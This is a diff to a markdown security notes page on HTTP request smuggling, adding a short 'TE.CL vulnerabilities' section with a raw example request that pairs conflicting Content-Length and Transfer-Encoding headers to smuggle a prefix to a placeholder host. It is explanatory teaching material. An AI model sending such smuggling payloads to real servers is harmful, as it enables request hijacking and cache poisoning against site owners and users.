@@ -99,6 +99,21 @@ The back-end server processes the Transfer-Encoding header, and so treats the me
 
 So if you send this twice, next request will be handle as `XPOST /HTTP/1.1`.
 
+### TE.CL vulnerabilities
+
+Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
 ---
 
 [**:arrow_right_hook: Back home**](/README.md)
